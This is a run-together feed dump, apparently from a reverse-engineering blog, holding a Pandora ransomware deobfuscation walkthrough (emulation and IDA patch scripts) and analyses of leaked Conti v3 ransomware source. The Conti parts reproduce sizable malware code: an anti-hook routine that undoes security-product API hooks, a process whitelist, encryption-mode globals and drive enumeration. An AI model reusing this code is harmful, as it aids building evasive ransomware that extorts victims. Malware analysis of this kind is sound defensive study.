0x7ff6654a6f44, 'rcx'), (0x7ff6654a7008, 0x7ff6654a7022, 0x3cd69d30, 'cmovz', 0x7ff6654a7017, 'rcx'), (0x7ff6654a7052, 0x7ff6654a706c, 0xffffffffecce8ff1, 'cmovz', 0x7ff6654a7061, 'rcx')] bb_table means the Dispatcher bb, and this bb has two formats that uses (cmovl, cmovz) or uses (setl and setz) bb_orig_table means the origin payload bb Emulate Basic BlocksFor each dispatcher bb emulate the block both satisfying the condition and not satisfying it to produce both the jmp address for the conditional jmp and the jmp address for the unconditional jmp. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849DUMP_FILE = '13.25.dmp'from dumpulator import Dumpulatordp = Dumpulator(DUMP_FILE,quiet=True)bb_table = [(0x7ff6654a67f0, 0x7ff6654a6817, 0x10bc6c78, 'cmovl', 0x7ff6654a67fa, 'rdx'), (0x7ff6654a6819, 0x7ff6654a682e, 0xffffffffc30bae2e, 'cmovl', 0x7ff6654a6823, 'rdx'), (0x7ff6654a6830, 0x7ff6654a6845, 0xffffffffa2992627, 'cmovl', 0x7ff6654a683a, 'rdx'), (0x7ff6654a6847, 0x7ff6654a6861, 0xffffffffa22a16af, 'cmovl', 0x7ff6654a6856, 'rdx'), (0x7ff6654a6863, 0x7ff6654a687d, 0xffffffff8cbc0434, 'cmovz', 0x7ff6654a6872, 'rcx'), (0x7ff6654a68b0, 0x7ff6654a68c5, 0x6c249751, 'cmovl', 0x7ff6654a68ba, 'rdx'), (0x7ff6654a68c7, 0x7ff6654a68e1, 0x3b2b8a1e, 'cmovl', 0x7ff6654a68d6, 'rdx'), (0x7ff6654a68e3, 0x7ff6654a68fd, 0x173ba5e1, 'cmovl', 0x7ff6654a68f2, 'rdx'), (0x7ff6654a68ff, 0x7ff6654a6918, 0x10bc6c78, 'setz', 0x7ff6654a6906, 'rcx'), (0x7ff6654a69b0, 0x7ff6654a69ca, 0xffffffffd43fb344, 'cmovl', 0x7ff6654a69bf, 'rdx'), (0x7ff6654a69cc, 0x7ff6654a69e6, 0xffffffffcef7092e, 'cmovl', 0x7ff6654a69db, 'rdx'), (0x7ff6654a69e8, 0x7ff6654a6a02, 0xffffffffc30bae2e, 'cmovz', 0x7ff6654a69f7, 'rcx'), (0x7ff6654a6a30, 0x7ff6654a6a4a, 0x7d71a1e3, 'cmovl', 0x7ff6654a6a3f, 'rdx'), (0x7ff6654a6a4c, 0x7ff6654a6a66, 0x7a980236, 'cmovl', 0x7ff6654a6a5b, 'rdx'), (0x7ff6654a6a68, 0x7ff6654a6a82, 0x6c249751, 'cmovz', 0x7ff6654a6a77, 'rcx'), (0x7ff6654a6a99, 0x7ff6654a6ab3, 0xffffffffc094d6c9, 'cmovl', 0x7ff6654a6aa8, 'rdx'), (0x7ff6654a6ab5, 0x7ff6654a6acf, 0xffffffffa2992627, 'cmovz', 0x7ff6654a6ac4, 'rcx'), (0x7ff6654a6b09, 0x7ff6654a6b1e, 0x3cd69d30, 'setl', 0x7ff6654a6b10, 'rdx'), (0x7ff6654a6b20, 0x7ff6654a6b39, 0x3b2b8a1e, 'setnz', 0x7ff6654a6b27, 'rcx'), (0x7ff6654a6b63, 0x7ff6654a6b7d, 0xffffffffecce8ff1, 'cmovl', 0x7ff6654a6b72, 'rdx'), (0x7ff6654a6b7f, 0x7ff6654a6b99, 0xffffffffd43fb344, 'cmovz', 0x7ff6654a6b8e, 'rcx'), (0x7ff6654a6bbb, 0x7ff6654a6bd5, 0x7d9d86f3, 'cmovl', 0x7ff6654a6bca, 'rdx'), (0x7ff6654a6bd7, 0x7ff6654a6bf1, 0x7d71a1e3, 'cmovz', 0x7ff6654a6be6, 'rcx'), (0x7ff6654a6c45, 0x7ff6654a6c5f, 0xffffffffa22a16af, 'cmovz', 0x7ff6654a6c54, 'rcx'), (0x7ff6654a6ce1, 0x7ff6654a6cfb, 0x173ba5e1, 'cmovz', 0x7ff6654a6cf0, 'rcx'), (0x7ff6654a6e83, 0x7ff6654a6e9d, 0xffffffffcef7092e, 'cmovz', 0x7ff6654a6e92, 'rcx'), (0x7ff6654a6edc, 0x7ff6654a6ef6, 0x7a980236, 'cmovz', 0x7ff6654a6eeb, 'rcx'), (0x7ff6654a6f3d, 0x7ff6654a6f56, 0xffffffffc094d6c9, 'setz', 0x7ff6654a6f44, 'rcx'), (0x7ff6654a7008, 0x7ff6654a7022, 0x3cd69d30, 'cmovz', 0x7ff6654a7017, 'rcx'), (0x7ff6654a7052, 0x7ff6654a706c, 0xffffffffecce8ff1, 'cmovz', 0x7ff6654a7061, 'rcx')]bb_jmp_table = []def emulate_bb(bb_start, bb_end, eax_value, jmp_reg): dp.regs.eflags = 0 dp.regs.r15 = 0x190 dp.regs.r14 = 0x0FFFFFFFFAE6529F8 dp.regs.r13 = 0x10 dp.regs.r12 = 0x1B0 dp.regs.rcx = 0x00007FF6654A6CFD dp.regs.rax = eax_value dp.start(bb_start,end=bb_end) jmp_reg_value = dp.regs.__getattr__(jmp_reg) return jmp_reg_valuefor bb in bb_table: bb_start = bb[0] bb_end = bb[1] eax_value = bb[2] jmp_condition = bb[3] jmp_condition_address = bb[4] jmp_register = bb[5] # plus or minus the eax_value is used to satisfied the asm code, so that we can get the jmp address if jmp_condition == 'cmovl' or jmp_condition == 'setl': jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value - 1, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) elif jmp_condition == 'cmovz' or jmp_condition == 'setz': jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) elif jmp_condition == 'setnz': jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value, jmp_register) print(f&quot;BB {hex(bb_start)}:{hex(bb_end)} - jmp_addr_satisfied: {hex(jmp_addr_satisfied)} - jmp_addr_unsatisfied: {hex(jmp_addr_unsatisfied)}&quot;) bb_jmp_table.append((bb_start,bb_end,eax_value,jmp_condition,jmp_condition_address,jmp_register,jmp_addr_satisfied,jmp_addr_unsatisfied))for bb in bb_jmp_table: print(bb) ida patchconditions cmovl setl————jl cmovz setz————jz setnz————jnz so why this??? 12345cmovl rdx, r12 ; Move if Less (SF!=OF)cmovz rdx, rbp ; Move if Zero (ZF=1)setz dl ; Set Byte if Zero (ZF=1)setl dl ; Set Byte if Less (SF!=OF)setnz dl ; Set Byte if Not Zero (ZF=0) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import struct bb_jmp_table = [(140696238057456, 140696238057495, 280783992, 'cmovl', 140696238057466, 'rdx', 140696238057497, 140696238057648), (140696238057497, 140696238057518, 18446744072686906926, 'cmovl', 140696238057507, 'rdx', 140696238057520, 140696238057904), (140696238057520, 140696238057541, 18446744072142530087, 'cmovl', 140696238057530, 'rdx', 140696238057543, 140696238058137), (140696238057543, 140696238057569, 18446744072135251631, 'cmovl', 140696238057558, 'rdx', 140696238057571, 140696238058565), (140696238057571, 140696238057597, 18446744071775716404, 'cmovz', 140696238057586, 'rcx', 140696238057599, 140696238057456), (140696238057648, 140696238057669, 1814337361, 'cmovl', 140696238057658, 'rdx', 140696238057671, 140696238058032), (140696238057671, 140696238057697, 992709150, 'cmovl', 140696238057686, 'rdx', 140696238057699, 140696238058249), (140696238057699, 140696238057725, 389785057, 'cmovl', 140696238057714, 'rdx', 140696238057727, 140696238058721), (140696238057727, 140696238057752, 280783992, 'setz', 140696238057734, 'rcx', 140696238057754, 140696238057456), (140696238057904, 140696238057930, 18446744072975528772, 'cmovl', 140696238057919, 'rdx', 140696238057932, 140696238058339), (140696238057932, 140696238057958, 18446744072886880558, 'cmovl', 140696238057947, 'rdx', 140696238057960, 140696238059139), (140696238057960, 140696238057986, 18446744072686906926, 'cmovz', 140696238057975, 'rcx', 140696238057988, 140696238057456), (140696238058032, 140696238058058, 2104599011, 'cmovl', 140696238058047, 'rdx', 140696238058060, 140696238058427), (140696238058060, 140696238058086, 2056782390, 'cmovl', 140696238058075, 'rdx', 140696238058088, 140696238059228), (140696238058088, 140696238058114, 1814337361, 'cmovz', 140696238058103, 'rcx', 140696238058116, 140696238057456), (140696238058137, 140696238058163, 18446744072645564105, 'cmovl', 140696238058152, 'rdx', 140696238058165, 140696238059325), (140696238058165, 140696238058191, 18446744072142530087, 'cmovz', 140696238058180, 'rcx', 140696238058193, 140696238057456), (140696238058249, 140696238058270, 1020697904, 'setl', 140696238058256, 'rdx', 140696238058272, 140696238059528), (140696238058272, 140696238058297, 992709150, 'setnz', 140696238058279, 'rcx', 140696238057456, 140696238058299), (140696238058339, 140696238058365, 18446744073387544561, 'cmovl', 140696238058354, 'rdx', 140696238058367, 140696238059602), (140696238058367, 140696238058393, 18446744072975528772, 'cmovz', 140696238058382, 'rcx', 140696238058395, 140696238057456), (140696238058427, 140696238058453, 2107475699, 'cmovl', 140696238058442, 'rdx', 140696238058455, 140696238057416), (140696238058455, 140696238058481, 2104599011, 'cmovz', 140696238058470, 'rcx', 140696238058483, 140696238057456), (140696238058565, 140696238058591, 18446744072135251631, 'cmovz', 140696238058580, 'rcx', 140696238058593, 140696238057456), (140696238058721, 140696238058747, 389785057, 'cmovz', 140696238058736, 'rcx', 140696238058749, 140696238057456), (140696238059139, 140696238059165, 18446744072886880558, 'cmovz', 140696238059154, 'rcx', 140696238059167, 140696238057456), (140696238059228, 140696238059254, 2056782390, 'cmovz', 140696238059243, 'rcx', 140696238059256, 140696238057456), (140696238059325, 140696238059350, 18446744072645564105, 'setz', 140696238059332, 'rcx', 140696238059352, 140696238057456), (140696238059528, 140696238059554, 1020697904, 'cmovz', 140696238059543, 'rcx', 140696238059556, 140696238057456), (140696238059602, 140696238059628, 18446744073387544561, 'cmovz', 140696238059617, 'rcx', 140696238059630, 140696238057456)]for bb in bb_jmp_table: bb_start = bb[0] bb_end = bb[1] eax_value = bb[2] jmp_condition = bb[3] jmp_condition_address = bb[4] jmp_register = bb[5] jmp_addr_satisfied = bb[6] jmp_addr_unsatisfied = bb[7] patch_jmp_cond_start = jmp_condition_address jmp_rel_statisfied = jmp_addr_satisfied - (patch_jmp_cond_start + 6) #jz jnz jl address that satisfied the cmp eax,xxxxxx patch_jmp_start = patch_jmp_cond_start + 6 # long jump need 6 byte ,jmp need 5 byte jmp_rel = jmp_addr_unsatisfied - (patch_jmp_start + 5) # jmp relative address if jmp_condition == 'cmovl' or jmp_condition == 'setl': # jl patch_jmp_condition = b'\\x0f\\x8c' + struct.pack('&lt;i',jmp_rel_statisfied) patch_jmp = b'\\xe9' + struct.pack('&lt;i',jmp_rel) elif jmp_condition == 'cmovz' or jmp_condition == 'setz': # jz patch_jmp_condition = b'\\x0f\\x84' + struct.pack('&lt;i',jmp_rel_statisfied) patch_jmp = b'\\xe9' + struct.pack('&lt;i',jmp_rel) elif jmp_condition == 'setnz': # jnz patch_jmp_condition = b'\\x0f\\x85' + struct.pack('&lt;i',jmp_rel_statisfied) patch_jmp = b'\\xe9' + struct.pack('&lt;i',jmp_rel) # calculat nops for end of patch total_bytes = bb_end - jmp_condition_address + 2 nop_count = total_bytes - 11 # 11 bytes for the patch + nops to fill space patch_bytes = patch_jmp_condition + patch_jmp + b'\\x90'* nop_count # patch the bytes patch_ptr = jmp_condition_address # print(&quot;ggod&quot;) for c in patch_bytes: patch_byte(patch_ptr, c) patch_ptr += 1 analysis1print(hex(patch_jmp_cond_start),hex(jmp_rel_statisfied),hex(patch_jmp_start),hex(jmp_rel)) output beblow 123456789101112131415161718192021222324252627282930313233343536patch_jmp_cond_start jmp_rel_statisfied patch_jmp_start jmp_rel0x7ff6654a67fa 0x19 0x7ff6654a6800 0xab0x7ff6654a6823 0x7 0x7ff6654a6829 0x1820x7ff6654a683a 0x7 0x7ff6654a6840 0x2540x7ff6654a6856 0x7 0x7ff6654a685c 0x3e40x7ff6654a6872 0x7 0x7ff6654a6878 -0x8d0x7ff6654a68ba 0x7 0x7ff6654a68c0 0x16b0x7ff6654a68d6 0x7 0x7ff6654a68dc 0x2280x7ff6654a68f2 0x7 0x7ff6654a68f8 0x3e40x7ff6654a6906 0xe 0x7ff6654a690c -0x1210x7ff6654a69bf 0x7 0x7ff6654a69c5 0x1990x7ff6654a69db 0x7 0x7ff6654a69e1 0x49d0x7ff6654a69f7 0x7 0x7ff6654a69fd -0x2120x7ff6654a6a3f 0x7 0x7ff6654a6a45 0x1710x7ff6654a6a5b 0x7 0x7ff6654a6a61 0x4760x7ff6654a6a77 0x7 0x7ff6654a6a7d -0x2920x7ff6654a6aa8 0x7 0x7ff6654a6aae 0x48a0x7ff6654a6ac4 0x7 0x7ff6654a6aca -0x2df0x7ff6654a6b10 0xa 0x7ff6654a6b16 0x4ed0x7ff6654a6b27 -0x33d 0x7ff6654a6b2d 0x90x7ff6654a6b72 0x7 0x7ff6654a6b78 0x4d50x7ff6654a6b8e 0x7 0x7ff6654a6b94 -0x3a90x7ff6654a6bca 0x7 0x7ff6654a6bd0 -0x40d0x7ff6654a6be6 0x7 0x7ff6654a6bec -0x4010x7ff6654a6c54 0x7 0x7ff6654a6c5a -0x46f0x7ff6654a6cf0 0x7 0x7ff6654a6cf6 -0x50b0x7ff6654a6e92 0x7 0x7ff6654a6e98 -0x6ad0x7ff6654a6eeb 0x7 0x7ff6654a6ef1 -0x7060x7ff6654a6f44 0xe 0x7ff6654a6f4a -0x75f0x7ff6654a7017 0x7 0x7ff6654a701d -0x8320x7ff6654a7061 0x7 0x7ff6654a7067 -0x87c patch_jmp_cond_start = jmp_condition_address jmp_rel_statisfied = jmp_addr_satisfied - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = jmp_addr_unsatisfied - (patch_jmp_start + 5) this means","link":"/2022/04/13/Pandora-Ransomeware-fla-unpack/"},{"title":"anti-hook","text":"intropart of conti v3 Ransomeware, by the way, fucking the school’s midterm exam. I’m longing for the day becoming stronger in Virus Learning. 打开系统对应的文件导入kernel32.dll并获取文件路径,打开文件 1234567891011121314151617181920212223242526272829303132333435HMODULE hKernel32 = apLoadLibraryA(_STR(&quot;kernel32.dll&quot;));apGetModuleFileNameW(hmodule, moduleRealPath, MAX_PATH);hFile = pCreateFileW(moduleRealPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); if (!hFile) return; DWORD Size = 0; DWORD H; LARGE_INTEGER LargeInt; pGetFileSizeEx(hFile, &amp;LargeInt); Size = LargeInt.QuadPart; if (!Size) { pCloseHandle(hFile); return; }hFileMap = apCreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL); if (!hFileMap) { pCloseHandle(hFile); return; }originDll = (LPBYTE)apMapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, Size); if (!originDll) { pCloseHandle(hFileMap); pCloseHandle(hFile); return; } 获取modules NT Header 在 IMAGE_DOS_HEADER 结构体中的 e_lfanew 成员指定了 NT 头的偏移为 000000f0。这两个范围中间就是 DOS stub 的偏移区域。 计算NT头的指针 1PNTHeader = ImageBase + dosHeader -&gt;e_Ifanew 根据NT_headers 找到OptionalHeader 1234567891011121314151617181920typedef struct _IMAGE_NT_HEADERS64 {DWORD Signature;IMAGE_FILE_HEADER FileHeader;IMAGE_OPTIONAL_HEADER64 OptionalHeader;} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;typedef struct _IMAGE_NT_HEADERS {DWORD Signature;IMAGE_FILE_HEADER FileHeader;IMAGE_OPTIONAL_HEADER32 OptionalHeader;} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; Optional Headers 1234567891011121314151617181920212223242526272829303132typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; IMAGE_DATA_DIRECTORY结构如下 检查文件位数，并获取IMAGE_DATA_DIRECTORY数据。12345678910111213141516171819202122// get the File Offset of the modules NT HeaderuiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;if (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic){ uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32) uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];}else{ if (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic) { uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64) uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; } else { pCloseHandle(hFileMap); pCloseHandle(hFile); return; }} 然后根据uiBaseAddress和uiExportDir获取如下数据 export directory name pointers the array of addresses the array of name ordinals the number of exported functions 结构体_IMAGE_EXPORT_DIRECTORY 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 1234567891011121314151617181920// get the File Offset of the export directory uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress); // get the File Offset for the array of name pointers uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames, uiBaseAddress); // get the File Offset for the array of addresses uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress); // get the File Offset for the array of name ordinals uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress); // get a counter for the number of exported functions... dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;NumberOfNames; 获取导出函数表12345678910111213141516171819202122uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew; if (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic) { uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32) uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; } else { if (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic) { uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64) uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; } else { pCloseHandle(hFileMap); pCloseHandle(hFile); return; } }} 检查hook 遍历函数 检查是否有转发函数（这个概念还不是很清楚），若是则跳过 比较当前函数和系统中函数是否相同 若函数已经被hook，则利用函数的前5byte进行覆盖，即antihook 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD)) { char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress)); uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress); // use the functions name ordinal as an index into the array of name pointers // loop the uiAddressArray with the uiNameOrdinals uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD)); // compute the File Offset to the function code UINT_PTR funcAddr = uiBaseAddress + Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress); // pass the for bool isForwarder = isForwardedFunc((const void*)funcAddr); if (isForwarder) continue; void* funcHooked = apGetProcAddress(hmodule, cpExportedFunctionName); if (!funcHooked) continue; BYTE* p = (BYTE*)funcHooked; if (p[0] != 0xe9) { if (p[0] != 0xff) continue; if (p[1] != 0x25) continue; }#ifdef __MINGW32__ bool funcIsHooked = (memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0);#else bool funcIsHooked = m_memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0;#endif // __MINGW32 if (!funcIsHooked) continue; DWORD oldProtect = 0; DWORD oldProtect1 = 0; /* typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD); VirtualProtectFunc pVirtualProtect = (VirtualProtectFunc)GetProcAddress(hKernel32, _STR(&quot;VirtualProtect&quot;)); */ if (!apVirtualProtect(funcHooked, 64, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) break; //memcpy((void*)funcHooked, (void*)funcAddr, 10); CopyMemory((void*)funcHooked, (void*)funcAddr, 10); if (!apVirtualProtect(funcHooked, 64, oldProtect, &amp;oldProtect1)) break;","link":"/2022/04/18/anti-hook/"},{"title":"Conti v3 Ransomeware Souce Code Analysis","text":"prockillerprockillermemorySnapshot pCreateToolhelp32Snapshot pProcess32FirstW pProcess32NextW 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &quot;prockiller.h&quot;#include &lt;TlHelp32.h&gt;#include &lt;winternl.h&gt;#include &quot;../api/getapi.h&quot;#include &quot;../obfuscation/MetaString.h&quot;#include &quot;../memory.h&quot;VOID process_killer::GetWhiteListProcess(__out PPID_LIST PidList){ HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapShot == NULL) { return; } PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W); if (!pProcess32FirstW(hSnapShot, &amp;pe32)) { pCloseHandle(hSnapShot); return; } do { if (!plstrcmpiW(pe32.szExeFile, OBFW(L&quot;explorer.exe&quot;))) { PPID Pid = (PPID)m_malloc(sizeof(PID)); if (!Pid) { break; } Pid-&gt;dwProcessId = pe32.th32ProcessID; TAILQ_INSERT_TAIL(PidList, Pid, Entries); } } while (pProcess32NextW(hSnapShot, &amp;pe32)); pCloseHandle(hSnapShot);} 12345678910111213typedef struct tagPROCESSENTRY32W{ DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID; // this process ULONG_PTR th32DefaultHeapID; DWORD th32ModuleID; // associated exe DWORD cntThreads; DWORD th32ParentProcessID; // this process's parent process LONG pcPriClassBase; // Base priority of process's threads DWORD dwFlags; WCHAR szExeFile[MAX_PATH]; // Path} PROCESSENTRY32W; szExeFile is the path the exe Whitelistadd the process that is not explorer.exe to whitelist.So if the file is open, Ransomeware will not encrypt it. #define TAILQ_INSERT_TAIL(head, elm, field) do { TAILQ_NEXT((elm), field) = NULL; (elm)-&gt;field.tqe_prev = (head)-&gt;tqh_last; *(head)-&gt;tqh_last = (elm); (head)-&gt;tqh_last = &amp;TAILQ_NEXT((elm), field); } while (0) 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &quot;prockiller.h&quot;#include &lt;TlHelp32.h&gt;#include &lt;winternl.h&gt;#include &quot;../api/getapi.h&quot;#include &quot;../obfuscation/MetaString.h&quot;#include &quot;../memory.h&quot;VOID process_killer::GetWhiteListProcess(__out PPID_LIST PidList){ HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapShot == NULL) { return; } PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W); if (!pProcess32FirstW(hSnapShot, &amp;pe32)) { pCloseHandle(hSnapShot); return; } do { if (!plstrcmpiW(pe32.szExeFile, OBFW(L&quot;explorer.exe&quot;))) { PPID Pid = (PPID)m_malloc(sizeof(PID)); if (!Pid) { break; } Pid-&gt;dwProcessId = pe32.th32ProcessID; TAILQ_INSERT_TAIL(PidList, Pid, Entries); } } while (pProcess32NextW(hSnapShot, &amp;pe32)); pCloseHandle(hSnapShot);} globalset some global parameters,maybe used to build different character sample(extension,mutex…..) Extention DecryptionNote EncryptMode ALL_ENCRYPT 10 LOCAL_ENCRYPT 11 NETWORK_ENCRYPT 12 BACKUPS_ENCRYPT 13 PATH_ENCRYPT 14 IsProcKillerEnabled EncryptPath EncryptSize MutexName 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980STATIC WCHAR g_Extention[7] = L&quot;.EXTEN&quot;;STATIC CHAR g_DecryptNote[2048] = &quot;__DECRYPT_NOTE__&quot;;STATIC INT g_EncryptMode = ALL_ENCRYPT;STATIC BOOL g_IsProcKillerEnabled = FALSE;STATIC LPCWSTR g_EncryptPath = NULL;STATIC BYTE g_EncryptSize = 50;//STATIC CHAR g_MutexName[65] = &quot;__MUTEX_NAME__&quot;;PWCHAR global::GetExtention(){ return g_Extention;}PCHAR global::GetDecryptNote(){ return g_DecryptNote;}PCHARglobal::GetMutexName(){ //return g_MutexName; return NULL;}VOIDglobal::SetEncryptMode(INT EncryptMode){ g_EncryptMode = EncryptMode;}INTglobal::GetEncryptMode(){ return g_EncryptMode;}VOIDglobal::SetProcKiller(BOOL IsEnabled){ g_IsProcKillerEnabled = IsEnabled;}BOOL global::GetProcKiller(){ return g_IsProcKillerEnabled;}VOID global::SetEncryptPath(__in LPCWSTR Path){ g_EncryptPath = Path;}LPCWSTRglobal::GetEncryptPath(){ return g_EncryptPath;}BOOL global::SetEncryptSize(__in INT Size){ if (Size != 10 || Size != 15 || Size != 20 || Size != 25 || Size != 30 || Size != 35 || Size != 40 || Size != 45 || Size != 50 || Size != 60 || Size != 70 || Size != 80) { g_EncryptSize = 50; logslogs va_start va_arg va_end The RtlSecureZeroMemory routine fills a block of memory with zeros in a way that is guaranteed to be secure. init init in function main: 1234567LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-log&quot;));if (LogFile) { logs::Init(LogFile);} 1234567891011121314logs::Init(LPCWSTR LogFile){ pInitializeCriticalSection(&amp;g_CritSec); g_LogHandle = pCreateFileW( LogFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_FLAG_WRITE_THROUGH, NULL); pSetFilePointer(g_LogHandle, 0, NULL, FILE_END);} writewrite some errors. 1logs::Write(OBFW(L&quot;FindFirstFile fails in directory %s. GetLastError = %lu.&quot;), CurrentDirectory.c_str(), pGetLastError()); filesystemfilesystemdisks SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(0, NULL); pGetLogicalDriveStringsW(BufferLength, Buffer); GetLogicalDriveStringsW 1234DWORD GetLogicalDriveStringsW([in] DWORD nBufferLength,[out] LPWSTR lpBuffer); If the function succeeds, the return value is the length, in characters, of the strings copied to the buffer, not including the terminating null character. Note that an ANSI-ASCII null character uses one byte, but a Unicode (UTF-16) null character uses two bytes. If the buffer is not large enough, the return value is greater than nBufferLength. It is the size of the buffer required to hold the drive strings. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &quot;filesystem.h&quot;#include &quot;../api/getapi.h&quot;#include &quot;../memory.h&quot;#include &quot;../logs/logs.h&quot;INT filesystem::EnumirateDrives(__in PDRIVE_LIST DriveList){ INT Length = 0; INT DrivesCount = 0; DWORD DriveType = 0; TAILQ_INIT(DriveList); SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(0, NULL); if (!BufferLength) { return 0; } LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + 1) * sizeof(WCHAR)); if (!Buffer) { return 0; } pGetLogicalDriveStringsW(BufferLength, Buffer); LPWSTR tempBuffer = Buffer; while (Length = (INT)plstrlenW(tempBuffer)) { PDRIVE_INFO DriveInfo = new DRIVE_INFO; if (!DriveInfo) { free(Buffer); return 0; } DriveInfo-&gt;RootPath = tempBuffer; TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries); DrivesCount++; tempBuffer += Length + 1; } logs::Write(OBFW(L&quot;Found %d drives: &quot;), DrivesCount); PDRIVE_INFO DriveInfo = NULL; TAILQ_FOREACH(DriveInfo, DriveList, Entries) { logs::Write(OBFW(L&quot;%s&quot;), DriveInfo-&gt;RootPath.c_str()); } free(Buffer); return DrivesCount;} search MakeSearchMask used to generate a search mask path MakePath used to generate the file path CheckDirectory check if the directory is in the Blacklist, if yes then pass this directory. This is to make sure the system running without breaking. ``` OBFW(L”tmp”), OBFW(L”winnt”), OBFW(L”temp”), OBFW(L”thumb”), OBFW(L”$Recycle.Bin”), OBFW(L”$RECYCLE.BIN”), OBFW(L”System Volume Information”), OBFW(L”Boot”), OBFW(L”Windows”), OBFW(L”Trend Micro”), 